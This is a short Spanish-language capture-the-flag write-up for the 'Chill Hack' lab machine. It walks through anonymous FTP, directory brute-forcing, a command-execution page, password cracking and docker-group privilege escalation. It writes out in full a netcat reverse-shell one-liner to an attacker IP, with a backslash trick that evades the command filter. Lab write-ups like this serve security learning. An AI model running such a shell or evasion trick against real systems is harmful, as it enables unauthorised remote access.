# RESOLUCIÓN DE LA MÁQUINA CHILL HACK

## TASK 1 - INVESTIGATE!

Servicio ftp abierto con el usuario anonymous, hay un archivo txt dentro.

![image](https://github.com/user-attachments/assets/642f7a53-af42-497e-ab0f-d24d6d5c5f10)

![image](https://github.com/user-attachments/assets/0edde0a3-6cfe-4c2d-b75a-589d0faf3f02)

Hacemos fuerza bruta con gobuster y encontramos un directorio llamado /secret, que nos permite ejecutar comandos.

![image](https://github.com/user-attachments/assets/100abad4-4904-45ac-bd69-44d9fee92a3b)

![image](https://github.com/user-attachments/assets/c5cefd02-5b27-41a3-8d1d-28ae1d72c8c1)

Hacemos una reverse shell, pero poniendo una contrabarra al inicio para que nos acepte el comando.

r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.21.95.199 4444 >/tmp/f

![image](https://github.com/user-attachments/assets/cd4fa8d5-e6c4-47ab-b662-8474c7e6ee83)

User Flag

![image](https://github.com/user-attachments/assets/a5b0f006-ca3d-47ce-960b-4304123c679b)

Root Flag

![image](https://github.com/user-attachments/assets/dfe330e5-0def-4776-a7af-456917f38b06)

![image](https://github.com/user-attachments/assets/b4bc34df-24b4-4547-b127-a86f4774bfef)

Ahora hacemos un zip2john, un john y un unzip. Y ganamos acceso a un archivo que contiene una contraseña en base64.

![image](https://github.com/user-attachments/assets/4fdc6a09-559c-40d9-ab34-ab5be0368576)

La decodeamos, introducimos las credenciales obtenidas y ganamos acceso.

![image](https://github.com/user-attachments/assets/266baffd-0b1f-45ef-a9b9-499ccd6fa4d5)

Al ver que el usuario pertence al grupo docker nos vamos al GTFObins.

![image](https://github.com/user-attachments/assets/ac7a02e3-9827-48d9-9e57-319073caba2a)

Lo ejecutamos y ya somos root.

![image](https://github.com/user-attachments/assets/e94d565d-efbd-43ac-bc6a-635f995b70f8)





